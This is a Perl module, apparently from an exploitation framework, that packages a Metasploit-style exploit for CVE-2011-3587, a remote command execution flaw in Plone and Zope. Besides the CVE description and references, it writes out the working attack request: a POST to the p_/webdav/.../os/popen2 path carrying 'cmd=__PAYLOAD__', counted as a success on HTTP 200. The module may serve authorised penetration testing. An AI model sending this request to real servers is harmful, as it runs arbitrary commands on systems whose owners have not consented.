package PLONE::MSF::PlonePopen2;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PlonePopen2";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2011-3587",
  DESCRIPTION => "

        Unspecified vulnerability in Zope 2.12.x and 2.13.x, as used in Plone 4.0.x

        through 4.0.9, 4.1, and 4.2 through 4.2a2, allows remote attackers to execute

        arbitrary commands via vectors related to the p_ class in OFS/misc_.py and

        the use of Python modules.



      ",
  MSF_MODULE => "plone_popen2",
  OSVDB => 76105,
  REFERENCES => [
    "http://plone.org/products/plone/security/advisories/20110928",
  ],
  TITLE => "Plone and Zope XMLTools Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2',
      PAYLOAD      => 'cmd=__PAYLOAD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
